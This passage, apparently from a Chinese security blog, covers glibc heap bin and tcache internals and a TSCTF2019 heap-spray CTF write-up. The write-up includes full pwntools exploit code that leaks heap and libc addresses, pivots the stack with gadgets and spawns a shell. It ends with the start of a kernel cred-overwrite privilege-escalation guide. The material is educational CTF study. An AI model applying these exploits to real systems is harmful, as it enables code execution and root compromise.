index，index即为2-63，下图中64即为largebins的范围了。(SIZE_SZ在32，64位下分别位4，8。)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs4.jpg)\n\n(2)双向链表：\n\n▲例子：a=malloc(0x100); b=malloc(0x100); c=malloc(0x100)\n\n①free(a)之后:      smallbin,a\n\n```c\n#注释头\n\nsmallbin.bk->a;         a.bk->smallbin;      \nsamllbin.fd->a          a.fd->smallbin;\n```\n\n②free(b)之后:    smallbin,b,a\n\n```c\n#注释头\n\nsmallbin.bk->a;       a.bk->b    b.bk->smallbin\nsmallbin.fd->b;       b.fd->a    a.fd->smallbin\n```\n\n③free(c)之后：   smallbin,c,b,a\n\n```c\n#注释头\n\nsmallbin.bk->a;       a.bk->b    b.bk->c    c.bk->smallbin\nsmallbin.fd->c;       c.fd->b    b.fd->a    a.fd->smallbin\n```\n\n（fd,bk为bins[n]，bins[n+1]。fd和bk共同构成一个Binat。）\n\n(3)先进先出：\n\n①m=malloc(0x100):         m->a\n\n②n=malloc(0x100):         n->b\n\n(4)当有空闲chunk相邻时，Chunk会被合并成一个大chunk，这里指的是物理上的地址相邻，不是链表中相邻。通过判断当前chunk的in_use位的值来判断前一个chunk是否处于Free，如果是，那么合并。再通过当前chunk首地址加上size取得下一个chunk首地址，再将下一个chunk首地址加上它自己的size，取得下下个chunk的首地址，然后判断下下个chunk的in_use位的值看是否下个chunk处于Free，如果处于Free，则合并。\n\n \n\n \n\n3.largebins:放在bins[126]-bins[251]，共计63组，bin的index为64-126，最小chunk的大小不小于1024个字节。\n\n(1)归类方式：范围归类，例如bins[126]-bins[127]中保存chunk范围在[0x400,0x440]。且chunk在一个bin中按照从大到小排序，便于检索。其它与smallbins基本一致。\n\n①范围模式：由以下代码定义范围：\n\n```c\n#注释头\n\n#define largebin_index_64(sz)                                               \n  (((((unsigned long) (sz)) >> 6) <= 48) ?  48 + (((unsigned long) (sz)) >> 6) :\n   ((((unsigned long) (sz)) >> 9) <= 20) ?  91 + (((unsigned long) (sz)) >> 9) :\n   ((((unsigned long) (sz)) >> 12) <= 10) ? 110 + (((unsigned long) (sz)) >> 12) :\n   ((((unsigned long) (sz)) >> 15) <= 4) ? 119 + (((unsigned long) (sz)) >> 15) :\n   ((((unsigned long) (sz)) >> 18) <= 2) ? 124 + (((unsigned long) (sz)) >> 18) :\n   126)\n```\n\n②范围具体实例：\n\n```c\n#注释头\n\nsize                           index\n[0x400 , 0x440)                64\n[0x440 , 0x480)                65\n[0x480 , 0x4C0)                66\n[0x4C0 , 0x500)                67\n[0x500 , 0x540)                68\n等差 0x40      …\n[0xC00 , 0xC40)                96\n[0xC40 , 0xE00)                97\n[0xE00 , 0x1000)               98\n[0x1000 , 0x1200)              99\n[0x1200 , 0x1400)              100\n[0x1400 , 0x1600)              101\n等差 0x200    …\n[0x2800 , 0x2A00)              111\n[0x2A00 , 0x3000)              112\n[0x3000 , 0x4000)              113\n[0x4000 , 0x5000)              114\n等差 0x1000 …\n[0x9000 , 0xA000)              119\n[0xA000 , 0x10000)             120\n[0x10000 , 0x18000)            121\n[0x18000 , 0x20000)            122\n[0x20000 , 0x28000)            123\n[0x28000 , 0x40000)            124\n[0x40000 , 0x80000)            125\n[0x80000 , …. )                126\n```\n\n(2)双向链表，但是有两种排列方式：\n\n①取用排列：\n\n首先依据fd_nextsize，bk_nextsize两个指针大小找到适合的，然后按照正常的FIFO先进先出原则，通过fd,bk来排列。\n\n②大小排列：\n\n每个进入largebin的chunk\n\n其chunk_addr+0x20处即为其fd_nextsize指针，chunk_addr+0x28处为其bk_nextsize指针。\n\n然后通过fd_nextsize，bk_nextsize两个指针依据从大至小的顺序排列：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs5.png)\n\n(这张图片我也忘记从哪里整的了...侵删)\n\n其中size顺序为：D>C>B>A，但是释放顺序却不一定是这样的。设置这个的原因是当申请特定大小的堆块时，可以据此来快速查找，提升性能。\n\n(3)特殊解链：\n\n由于largebin中会存在fd_nextsize指针和bk_nextsize指针，所以通常的largebin_attack就是针对这个进行利用的。\n\n借用星阑科技的一张图说明一切：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs6.jpg)\n\n \n\n \n\n4.unsortedbins:bins[0]和bins[1]中，bins[0]为fd，bins[1]为bk，bin的index为1，双链表结构。\n\n(1)归类方式：只有一个bin，存放所有不满足fastbin，未被整理的chunk。\n\n(2)双向链表：\n\na=malloc(0x100); b=malloc(0x100); c=malloc(0x100)\n\n①free(a)之后:      unsortedbin,a\n\n```c\n#注释头\n\nunsortedbin.bk->a;  a.bk->unsortedbin;\nunsortedbin.fd->a;  a.fd->unsortedbin;\n```\n\n②free(b)之后:    unsortedbin,b,a\n\n```c\n#注释头\n\nunsortedbin.bk->a;  a.bk->b     b.bk->unsortedbin\nunsortedbin.fd->b;  b.fd->a     a.fd->unsortedbin\n```\n\n③free(c)之后：   unsortedbin,c,b,a\n\n```c\n#注释头\n\nunsortedbin.bk->a;  a.bk->b     b.bk->c     c.bk->unsortedbin\nunsortedbin.fd->c;  c.fd->b     b.fd->a     a.fd->unsortedbin\n```\n\n(3)先进先出：\n\n①m=malloc(0x100):         m->a\n\n②n=malloc(0x100):         n->b\n\n▲依据fd来遍历：\n\n如果fd链顺序为A->B->C\n\n那么解链顺序一定是先解C，再解B，再解A。\n\n \n\n \n\n \n\n5、Tcache机制：从libc-2.26及以后都有:先进后出，最大为0x410\n\n(1)结构：\n\n①2.29以下，无key字段的tcache，结构大小为0x240，包括chunk头则占据0x250:\n\n```c\n#注释头\n\ntypedef struct tcache_perthread_struct\n{\n  char counts[TCACHE_MAX_BINS];//0x40\n  tcache_entry *entries[TCACHE_MAX_BINS];//0x40\n} tcache_perthread_struct;\n```\n\nA.counts:是个数组，总共64个字节，对应tcache的64个bin，每个字节代表对应bin中存在chunk的个数，所以每个字节都会小于8，一般使用\n\n```c\n#注释头\n\ntc_idx = csize2tidx (size);\ntcache->counts[tc_idx]\n```\n\n来访问索引对应bin的count。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-08-08_23-01-51.png)\n\n从0x55555555b010至0x55555555b04f都是counts这个数组的范围。\n\n▲由于使用tcache时，不会检查tcache->counts[tc_idx]的大小是否处在[0,7]的范围，所以如果我们可以将对应bin的count改成[0,7]之外的数，这样下回再free该bin对应大小的chunk时，就不会将该chunk置入tcache中，使得tcache不满也能不进入tcache。\n\nB.entries：是个bin指针数组，共64个指针数组，每个指针8个字节，总计大小0x200字节，指针指向对应的bin中第一个chunk的首地址，这个首地址不是chunk头的首地址，而是对应数据的首地址。如果该bin为空，则该指针也为空。一般会使用tcache->entries[tc_idx] != NULL来判断是否为空。\n\n \n\n②2.29及以上，在entry中增加了key字段，结构体大小为0x290，count由原来的一个字节变为两个字节\n\n```c\n#注释头\n\ntypedef struct tcache_entry\n{\n  struct tcache_entry *next;\n  /* This field exists to detect double frees.  */\n  struct tcache_perthread_struct *key; /* 新增指针 */\n} tcache_entry;\n```\n\n(2)类似于一个比较大的fastbins。总共64个bin。\n\n(3)归类方式：\n\n相同大小的chunk归到一类：大小范围[0x20,0x410]。每组bins中的chunk大小一定。且一组bin中最多只能有7个chunk，如果free某大小bin的chunk数量超过7，那么多余的chunk会按照没有tcache机制来free。\n\n(4).单向链表：\n\n▲例子：a=malloc(0x10); b=malloc(0x10); c=malloc(0x10); d=malloc(0x10)\n\nFastbinY,d,c,b,a\n\n①free(a)之后：tcachebins[0x20]->a;  a.fd=0\n\n②free(b)之后：tcachebins[0x20]->b;  b.fd=a   a.fd=0\n\n③free(c)之后：tcachebins[0x20]->c;  c.fd=b    b.fd->a;  a.fd=0\n\n④free(d)之后：tcachebins[0x20]->d;  d.fd=c    c.fd->b;  b.fd->a;  a.fd=0\n\n★但是这里的fd指向的是chunk内容地址，而不是其它的bins中的fd指向的是chunk头地址。\n\n(5)后进先出，与fastbins类似。且tcache的优先级最高。\n\n(6)特殊：\n\n①当tcache某个bin被填满之后，再free相同大小的bin放到fastbin中或者smallbins中，之后连续申请7个该大小的chunk，那么tcache中的这个bin就会被清空。之后再申请该大小的chunk就会从fastbins或者smallbins中找，如果找到了，那么返回该chunk的同时，会将该大小的fastbin或者smallbin中所有的chunk都移动到对应大小的tcache的bin中，直至填满7个。(移动时仍旧遵循先进后出的原则，所以移动之后chunk顺序会发生颠倒)\n\n②libc-2.26中存在tcache poisoning漏洞，即可以连续free(chunk)多次。\n\n假如chunk0,chunk1，然后free(chunk0)两次，这样tcache bin中就是：\n\nchunk0.fd ->chunk0，即chunk0->chunk0\n\n那么第一次申请回chunk0，修改fd为fakechunk，tcache bin中就是：\n\nchunk0.fd->fakechunk，即chunk0->fakechunk\n\n之后再申请回chunk0，再申请一次就是fakechunk了，实现任意地址修改。\n\n★这个漏洞在libc2.27中就被修复了。\n\n③从tcache中申请Chunk的时候不会检查size位，不需要构造字节错误。\n\n(7)2.31下新增stash机制：\n\n在 Fastbins 处理过程中新增了一个 Stash 机制，每次从 Fastbins 取 Chunk 的时候会把剩下的 Chunk 全部依次放进对应的 tcache，直到 Fastbins 空或是 tcache 满。\n\n(8)2.32下新增fd异或机制：\n\n会将fd异或上某个值。这个具体看其他文章吧，我自己调试大多都是异或heap_base/0x1000，比较奇怪，具体题目具体分析。\n\n \n\n \n\n \n\n6.Topchunk:不属于任何Bin，在arena中属于最高地址，没有其它空闲块时，topchunk就会被用于分配。\n\n \n\n \n\n7.last_remainder:当请求small chunk大小内存时，如果发生分裂，则剩余的chunk保存为last_remainder，放入unsortedbin中。\n\n \n\n \n\n▲没有tcache的malloc和free流程：\n\n四、malloc流程：\n\n★如果是多线程情况下，那么会先进行分配区的加锁，这里就可能存在条件竞争漏洞。\n\n1.如果size在fastbins的范围内，则先在fastbins中查找，找到则结束，没找到就去unsortedbins中找。\n\n2.如果size不在fastbins范围中，而在smallbins范围中，则查找smallbins（在2.23下如果发现smallbin链表未初始化，则会调用malloc_consolidate函数，但是实际情况在申请chunk之前都已经初始化过了，所以这个不怎么重要if (victim == 0) /* initialization check */ malloc_consolidate (av); 而且这个操作从2.27开始已经没有了，如果能够让smallbin不初始化，或者将main_arena+0x88设置为0），此时若smallbin找到结束，没找到去unsortedbins中找\n\n3.如果size不在fastbins，smallbins范围中，那一定在largebins中，那么先调用malloc_consolidate函数将所有的fastbin中的chunk取出来，合并相邻的freechunk，放到unsortedbin中，或者与topchunk合并。再去largebins中找，找到结束，没找到就去unsortedbins中找。\n\n4.unsortedbins中查找：\n\n(1)如果unsortedbin中只有last_reaminder，且分配的size小于last_remainder，且要求的size范围为smallbin的范围，则分裂，将分裂之后的一个合适的chunk给用户，剩余的chunk变成新的last_remainder进入unsortedbin中。如果大于last_remainder，或者分配的size范围为largebin的范围，则将last_remainder整理至对应bin中，跳至第5步。\n\n(2)如果unsortedbin中不只一个chunk，则先整理，遍历unsortedbins。如果遇到精确大小，直接返回给用户，接着整理完。如果一直没遇到过，则该过程中所有遇到的chunk都会被整理到对应的fastbins，smallbins，largebins中去。\n\n5.unsortedbins中还是找不到，则：\n\n(1)若当前size最开始判断是处于smallbins范围内，则再去smallbins找，这回不找精确大小，找最接近略大于size的一个固定大小的chunk给分裂，将符合size的chunk返回给用户，剩下的扔给unsortedbins，作为新的last_remainder。\n\n(2)若当前size最开始判断处于largebins范围内，则去largebins中找，和步骤(1)类似。\n\n(3)若当前size大于largebins中最大的chunk大小，那么就去topchunk来分割使用。\n\n6.topchunk分割：\n\n(1)topchunk空间够，则直接分割。\n\n(2)topchunk空间不够，那么再调用malloc_consolidate函数进行整理一下，然后利用brk或者mmap进行再拓展。\n\n①brk扩展：当申请的size小于128K时，使用该扩展。向高地址拓展新的topchunk，一般加0x21000，之后从新的topchunk再分配，旧的topchun进入unsortedbin中。\n\n②mmap扩展：申请的size大于等于mmap分配阈值(最开始为128k)时，使用该扩展，但是这种扩展申请到的chunk，在释放时会调用munmap函数直接被返回给操作系统，而不会进入bins中。所以如果用指针再引用该chunk块时，就会造成segmentation fault错误。\n\n▲当ptmalloc munmap chunk时，如果回收的chunk空间大小大于mmap分配阈值的当前值，并且小于DEFAULT_MMAP_THRESHOLD_MAX（32位系统默认为512KB，64位系统默认为32MB），ptmalloc会把mmap分配阈值调整为当前回收的chunk的大小，并将mmap收缩阈值（mmap trim threshold）设置为mmap分配阈值的2倍。这就是ptmalloc的对mmap分配阈值的动态调整机制，该机制是默认开启的，当然也可以用mallopt()关闭该机制\n\n▲如果将 M_MMAP_MAX 设置为 0，ptmalloc 将不会使用 mmap 分配大块内存。\n\n \n\n五、free流程：\n\n★多线程情况下，free()函数同样首先需要获取分配区的锁，来保证线程安全。\n\n1.首先判断该chunk是否为mmaped chunk，如果是，则调用 munmap()释放mmaped chunk，解除内存空间映射，该该空间不再有效。同时满足条件则调整mmap阈值。\n\n2.如果size位于fastbins范围内，直接放到fastbins中。\n\n(这里有点争议，在《glibc内存管理ptmalloc源代码分析.pdf》一书中，写到：\n\n如果执行到这一步，说明释放了一个与top chunk相邻的chunk。则无论它有多大，都将它与top chunk合并，并更新top chunk的大小等信息。\n\n但是实际测试，如果size位于fastbins范围内，则不管是否与topchunk相邻，都直接放到fastbin中，测试环境是libc2.23，内核版本是Linux version 5.10.13，也可能是某些参数的问题把，具体题目分析就好了。)\n\n3.如果size不在fastbins范围内，则进行判断：\n\n(1)先判断前一个chunk_before，如果chunk_before是free状态的，那么就将前一个chunk从其对应的bins中取出来(unlink)，然后合并这两个chunk和chunk_before。\n\n由于还没有进入链表结构中，所以这里寻找chunk_before地址是通过当前地址减去当前chunk的presize内容，得到chunk_before的地址，从而获取其in_use位。\n\n这也是presize唯一的用途，所以在堆溢出中，可以只要不进行free，presize可以任意修改。\n\n(这里如果chunk_before是位于fastbins中则没办法合并，因为在fastbins中的in_use位不会被改变，永远是1，在判断时始终认为该chunk是处于allocated状态的)\n\n(2)再判断后一个chunk，如果后一个chunk是free状态，那么如步骤(1)，合并，之后将合并和的chunk放入到unsortedbins中去。如果后一个chunk就是topchunk，那么直接将这个chunk和topchunk合并完事。\n\n之后将合并之后的chunk进行判断，(这里也可能不发生合并，但依旧会进行判断)如果size大于FASTBIN_CONSOLIDATION_THRESHOLD(0x10000)，那么就调用malloc_consolidate函数进行整理fastbins，然后给到unsortedbins中，等待malloc时进行整理。\n\n \n\n▲32位与64位区别，差不多其实，对于0x8和0x10的变化而已：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs1.jpg)\n","tags":["Heap-Knowledge"],"categories":["PWN","pwn堆"]},{"title":"TSCTF2019 薛定谔的堆块-HeapSpray","url":"/2021/08/18/TSCTF2019 薛定谔的堆块-HeapSpray/","content":"\nheapspray有很多的应用场景，但大多都是windows下的漏洞应用，关于Glibc的比较少，至今只看见两题：\n\n[pwnhub.cn 故事的开始 calc](https://atum.li/2016/12/05/calc/)\n\n[TSCTF2019 薛定谔的堆块](https://www.anquanke.com/post/id/206484)\n\n这里参考第二篇文章针对第二题做个复现，理解下堆喷的思想。\n\n1.函数理解，这里分析起来比较麻烦，最好就调试，直接给出相关的功能：\n\n(1)Create函数：\n\n①创建chunk，但每次Create会创建0x10个相同大小的chunk，且大小为输入size+4。比如输入size为0xc，那么创建的chunk就是0x10个0x18大小的Chunk。同时每0x10个小chunk在宏观意义上组成一个大chunk，这里用SmallChunk和BigChunk区分一下。\n\n②chunk的索引在全局数组dword_4060，chunkList中随机排列，比如idx为0的chunk不一定是第一个创建的。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-08-10_21-46-26.png)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-08-10_21-49-21.png)\n\n这点在后面堆喷会用到，无法简单地通过打印值来判断heap地址，只能判断出在哪个BigChunk中，还得判断出某个SmallChunk在BigChunk中的位置才能泄露出堆地址。\n\n③创建chunk读取数据时read_str函数里有\\x00截断，所以Display在没有UAF的情况下难以泄露出地址，这里也不存在堆溢出。\n\n④选择chunk类型时会给chunk_addr+size处赋值，这里就是之前申请size+4的原因。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-08-10_21-56-19.png)\n\n这个赋予的值是一个ELF上的data数据地址，没啥用，迷惑用的，同时如果选择的选项不为1-4的话，就会不赋值，这个在后面很有用。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-08-10_21-58-56.png)\n\n(2)Display函数：\n\n比较常规，输出给定index范围的SmallChunk的内容\n\n(3)Delete函数：\n\n删除最后一次Create的BigChunk的所有SmallChunk，free数据且置指针NULL，没啥漏洞。但是这里删除是依据chunkList的顺序索引删除，而chunkList又是被打乱的，所以删除之后的顺序其实不是我们最开始输入数据的顺序，这个在后面unsortedbin泄露数据的时候需要注意一下。\n\n(4)Modify函数：\n\n编辑指定index的Small Block的内容，这里没啥用\n\n(5)CallFunction函数：\n\n根据Create时的最后那4byte的数值来决定执不执行某个函数指针(这个函数指针就是最开始创建的时候赋值的ELF上的数据)。\n\n①*(chunk_addr+size) != 0，则set *(*(chunk_addr+size)) -= 1\n\n②*(chunk_addr+size) == 0，则jmp *(*(chunk_addr+size))+0x4\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-08-10_23-06-41.png)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-08-10_23-07-14.png)\n\n这里调用CallFunction函数之后就可以调用到0xf7e87401，这里的*0x57d1ab8c是我们在堆上设置好的内容。\n\n2.漏洞发现：\n\n这里就结合Create函数，利用先申请填充内容之后再释放，使得*(chunk_addr+size)可控，从而能够调用任意函数。但是在保护全开的情况下想要调用函数，必须需要泄露地址，而地址在没有漏洞的情况下又没办法泄露。\n\n堆喷原理：https://www.cnblogs.com/Fang3s/articles/3911561.html\n\n(1)堆喷结合CallFunction函数的-1泄露地址：\n\n假设某个堆地址：magic_addr。由于这里可以Display，所以如果*magic_addr= magic_addr-1，而利用堆喷使得一定范围内的堆内容都为magic_addr，打印内容之后，就可以依据打印的内容，能够从中筛选出magic_addr，获取其索引，再经过我们制造堆喷过程中运算就能得到开始堆喷的地址start_addr。\n\n比如：magic_addr = 0x58585858，申请了0x100个0x20000大小的Chunk，那么得到索引为0x58，且magic_addr 也是一个0x20000的chunk，就可求得start_addr为0x58585858-0x58*0x20000。当然这是理论上的，实际还得一系列的判断运算。\n\n同理，在当我们释放堆块进入unsortedbin之后，踩下main_arena地址再申请回来，由于\\x00截断很难泄露出地址，这里也是采用这个方法，使得\\x00-1成为0xff来把\\x00截断给抹杀。\n\n(2)有了地址之后就可调用libc上任意的函数了，这里的one_gadget都用不了，在没办法往栈上输入数据的情况下就需要栈劫持了，这里找两个gadget，原题给的是：\n\n```python\n#注释头\n\nmagic_gadget1 = 0x00161871# 0x00161871 : xchg eax, ecx ; cld ; call dword ptr[eax]\nmagic_gadget2 = 0x00072e1a# 0x00072e1a : xchg eax, esp ; sal bh, 0xd8 ;\n```\n\n我用我自己编译的Libc是：\n\n```python\n#注释头\n\nmagic_gadget1 = 0x00164401# 0x00161871 : xchg eax, ecx ; cli ; jmp dword ptr[eax]\nmagic_gadget2 = 0x00073c10+0x3a# 0x00072e1a : xchg eax, esp ; sal bh, 0xd8 ;\n```\n\n一样的，没啥区别，得自己找去。ROPgadget。\n\n在调用jmp *(*(chunk_addr+size))+0x4时，看到context为\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-08-10_23-38-18.png)\n\n这里的ecx就保存这一个堆地址，那么我们就利用ecx和eax结合这两个gdaget来进行栈劫持，从而getshell。\n\n3.exp编写：\n\n(1)堆喷堆布局，填充数据在堆上，满足*magic_addr=magic_addr，且其他chunk的所有数据也为magic_addr\n\n```python\n#注释头\n\n#----------------------------------------\n#fill 0x58 to all chunk\ndata = []\nfor i in range(0x10):\n    data.append(['X' * (0x20000 - 1), 1])\nmalloc(0x20000, data)\ndelete()\n\nfor i in range(0x10):\n    malloc(0x20000, data)\n\n#idx 0x0->0x100-1\n#----------------------------------------\n```\n\n(2)填充需要触发的chunk数据，满足*chunk_addr + size = magic_addr，然后调用callfuc函数使得*magic_addr= magic_addr-1，打印数据之后即可判断。\n\n```python\n#-----------------------------------------------\n#fill 0x1000 all 0x58 (idx 0x100->0x110-1)\ndata = []\nfor i in range(0x10):\n    data.append(['X' * (0x1000 - 1), 1])\nmalloc(0x1000, data)\ndelete()\n\n\ndata = []\nfor i in range(0x10):\n    data.append(['X' * (0xf0 - 1), 0])\nmalloc(0xf0, data)\n#idx 0x100->0x110-1\n\n\n#0x100->0x110-1 OK\ncallfuc(0x100)\nshow(0, 0x100)\n#-----------------------------------------------\n```\n\n(3)判断chunk基于的BigChunk索引：\n\n```python\n#注释头\n\nindex = 0\noffest = 0\nout = ''\nmagic_addr = 0x58585858\nfor i in range(0x100):\n    out = p.recvline()\n    if 'W' in out:\n        index = i\n        break\nout = out[12 : ]\noffest = out.index('W')\n\nlog.info('magic_addr is : %d' % index)\nlog.info('offest is : %d' % offest)\nlog.info('start addr is : ' + hex(magic_addr- offest))\nblock_start = (index / 0x10) * 0x10\n```\n\n(4)计算chunk在BigChunk中的位置：\n\n```python\n#注释头\n\ndelete()\ncount = 1\np_index = 0\nwhile 1:\n    log.info(\"start find prev block count = %d\" % count)\n    data = []\n    for i in range(0x10):\n        data.append([p32(magic_addr - 0x20008 * count) * (0x1000 / 4 - 1),\n1])\n    malloc(0x1000, data)\n    delete()\n\n    data = []\n    for i in range(0x10):\n        data.append(['X' * (0xa0 - 1), 0])\n    malloc(0xa0, data)\n\n    log.info(\"start call fuc count = %d\" % count)\n    callfuc(0x100)\n    show(block_start - 0x10, index + 1)\n    p_index = 0\n    out = ''\n    for i in range(index + 1 - block_start + 0x10):\n        out = p.recvline()\n        if 'W' in out:\n            p_index = i + block_start - 0x10\n            break\n    delete()\n    if p_index < block_start:\n        break\n    count += 1\n\n\nlog.info('block start is : %d' % block_start)\nlog.info('p_index is : %d' % p_index)\nheap_start_addr = magic_addr - 0x20008 * (count - 1 + 0x10 * (block_start / 0x10)) - offest - 8\nlog.info('heap start is : ' + hex(heap_start_addr))\n```\n\n同样的方法，依据地址顺序遍历BigChunk中的0x1-0x10的所有可能范围，对于修改*chunk_addr= magic_addr-1，然后打印判断得到各个索引对应的地址。由于创建的时候是random函数，所以也可以用爆破的方式解决，概率为1/16。\n\n(5)获取libc地址，方法是释放之后使之进入unsortedbin踩下地址，利用callfuc函数和字节错位的方法对抗\\x00截断从而泄露出地址：\n\n```python\n#注释头\n\nfor i in range(0x10):\n    delete()\n\ndata = []\nfor i in range(0x10):\n    data.append([p32(heap_start_addr + 8 + 3 ) * (0x1000 / 4 - 1), 1])\nmalloc(0x1000, data)\ndelete()\n\ndata = []\nfor i in range(0x10):\n    data.append(['aaa', 0])\nmalloc(0xa0, data)\ncallfuc(0)\nshow(0, 0x10)\nfor i in range(index + 1 - block_start + 0x10):\n    out = p.recvline()\n    out = out[12 : -1]\n    if 'aaa' != out:\n        libc_addr = u32(out[4 : 8]) + 1 - 0x1b07b0\n        break\nlog.info('libc addr is : ' + hex(libc_addr))\ndelete()\n```\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs1-1.png)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs2-1.png)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs3.png)\n\n这里的main_arena变化是因为0xedb7ab000变为了0xedb7afff，导致字节错位变化的，具体调试一下就知道\n\n(6)劫持栈，结合gadget来getshell。\n\n```python\n#注释头\n\nmagic_gadget1 = 0x00164401       \n#xchg eax, ecx ; cli ; jmp dword ptr[eax] \nmagic_gadget2 = 0x00073c10+0x3a  \n#xchg eax, esp ; sal bh, 0xd8 ;\nsystem_offest = 0x3adb0\nbinsh_addr = 0x15bb0b\n# gdb.attach(p)\n\ndata = []\nfor i in range(0x10):\n    data.append([p32(heap_start_addr + 12) * (0x1000 / 4 - 1), 1])\nmalloc(0x1000, data)\ndelete()\n\ndata = []\nfor i in range(0x10):\n    data.append([(p32(libc_addr + magic_gadget2) + p32(0) + p32(libc_addr\n+ magic_gadget1) + p32(0) * 4 + p32(libc_addr + system_offest) + p32(0) +\np32(libc_addr + binsh_addr)).ljust(0xa0 -1, '\\x00'), 0])\nmalloc(0xa0, data)\ncallfuc(0)\np.interactive()\n```\n\n这里关于最后堆上数据的布局需要调试才能知道，建议先随便写几个，然后调试的时候在写数据。\n\n▲题外话：这里其实并没有用到常规意义上的通过堆喷滑板0x0c，0x58之类的滑板指令来执行shellcode或者ROP，所以其实这里的magic_addr换成0x57575757，0x56565656也是一样可以的，只不过成功率可能会小不少，毕竟这里还最开始申请了一个随机大小的堆块，而且PIE堆的随机化程度也大多在0x56到0x58之间。\n\n4.总结：\n\n(1)堆喷思想：其实就是多级指针的思想，通过劫持指针来滑动程序流或者泄露地址。\n\n(2)调试：汇编指令一定要熟悉，像劫持栈常用的xchg eax,esp等。\n\n \n\n ","tags":["Heap-spray"],"categories":["PWN","pwn堆-spray"]},{"title":"pwn-kernel_常见提权手段","url":"/2021/08/18/pwn-kernel_常见提权手段/","content":"\n一、利用cred结构体提权：\n\n1.前置知识：\n\n(1)kernel中会为每个进程创建一个cred结构体，保存了该进程的权限等信息如（uid，gid）等，如果能修改这个结构体那么就修改了这个进程的权限。\n\n(2)修改进程的权限为root之后，再通过该进程开的shell那么也就是root权限了，实现提权。\n\n2.利用手段：\n\n(1)通过UAF，将一块已经释放的堆块修改大小为cred结构体大小，然后创建进程，就会将该堆块申请为cred结构体。\n\n(2)再通过UAF将该cred结构体中的uid、gid改掉，实现进程提权。\n\n▲那么如何知道cred结构体的大小呢，不同linux内核版本的cred结构体大小不同：\n\n①通过linux内核版本，上源码查看网址，查找对应的cred结构体：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191458125.jpeg)\n\n访问对应版本：https://elixir.bootlin.com/linux/v4.4.70/source/include/linux/cred.h\n\n可以看到某内核的cred结构体大小，这里是0xa8：\n\n```\n//注释头\n\nstruct cred {\n    atomic_t usage; 0x4\n    #ifdef CONFIG_DEBUG_CREDENTIALS debug选项去掉\n    atomic_t subscribers; /* number of processes subscribed */\n    void *put_addr;\n    unsigned magic;\n    #define CRED_MAGIC 0x43736564\n    #define CRED_MAGIC_DEAD 0x44656144\n    #endif\n    kuid_t uid; /* real UID of the task */ 0x4\n    kgid_t gid; /* real GID of the task */ 0x4\n    kuid_t suid; /* saved UID of the task */ 0x4\n    kgid_t sgid; /* saved GID of the task */ 0x4\n    kuid_t euid; /* effective UID of the task */ 0x4\n    kgid_t egid; /* effective GID of the task */ 0x4\n    kuid_t fsuid; /* UID for VFS ops */ 0x4\n    kgid_t fsgid; /* GID for VFS ops */ 0x4\n    unsigned securebits; /* SUID-less security management */ 0x4\n    kernel_cap_t cap_inheritable; /* caps our children can inherit */ 0x8\n    kernel_cap_t cap_permitted; /* caps we're permitted */ 0x8\n    kernel_cap_t cap_effective; /* caps we can actually use */ 0x8\n    kernel_cap_t cap_bset; /* capability bounding set */ 0x8\n    kernel_cap_t cap_ambient; /* Ambient capability set */ 0x8\n    #ifdef CONFIG_KEYS\n    unsigned char jit_keyring; /* default keyring to attach requested 0x8\n    * keys to */\n    struct key __rcu *session_keyring; /* keyring inherited over fork */ 0x8\n    struct key *process_keyring; /* keyring private to this process */ 0x8\n    struct key *thread_keyring; /* keyring private to this thread */ 0x8\n    struct key *request_key_auth; /* assumed request_key authority */ 0x8\n    #endif\n    #ifdef CONFIG_SECURITY\n    void *security; /* subjective LSM security */ 0x8\n    #endif\n    struct user_struct *user; /* real user ID subscription */ 0x8\n    struct user_namespace *user_ns; /* user_ns the caps and keyrings are relative to. */ 0x8\n    struct group_info *group_info; /* supplementary groups for euid/fsgid */ 0x8\n    struct rcu_head rcu; /* RCU deletion hook */ 0x10\n};\n```\n\n这里大小是去掉debug部分的成员的大小，因为题目给的bzImage内核文件一般都不包含debug选项，包含的话会特别大，这里后面标注的大小是某个大佬标注：\n\nhttps://www.jianshu.com/p/a465b3f6d7cb\n\n②直接自己写一个小module加载打印cred结构体大小：\n\n```\n//简单modules\n#include <linux/init.h>\n#include <linux/module.h>\n#include <linux/kernel.h>\n#include <linux/cred.h>\n\nMODULE_LICENSE(\"Dual BSD/GPL\");\nstruct cred c1;\nstatic int hello_init(void)\n{\n    printk(\"<1> Hello world!\\n\");\n    printk(\"size of cred : %d \\n\",sizeof(c1));\n    return 0;\n}\nstatic void hello_exit(void)\n{\n    printk(\"<1> Bye, cruel world\\n\");\n}\nmodule_init(hello_init);\nmodule_exit(hello_exit);\n```\n\nA.新建一个hello文件夹，放上述代码hello.c和Makefile，设置Makefile为：\n\n```\nobj-m := hello.o\n\nKERNELDR := /usr/src/linux-headers-4.15.0-22-generic\n\nPWD := $(shell pwd)\n\nmodules:\n$(MAKE) -C $(KERNELDR) M=$(PWD) modules\n\nmoduels_install:\n$(MAKE) -C $(KERNELDR) M=$(PWD) modules_install\n\nclean:\nrm -rf *.o *~ core .depend .*.cmd *.ko *.mod.c .tmp_versions\n```\n\n这里的KERNELDR目录是编译之后的kernel目录\n\nmake命令编译下这个hello.c，会生成几个文件，只需要hello.ko\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191458099.jpeg)\n\nB.在根文件系统中vim init，设置一下，加上insmod 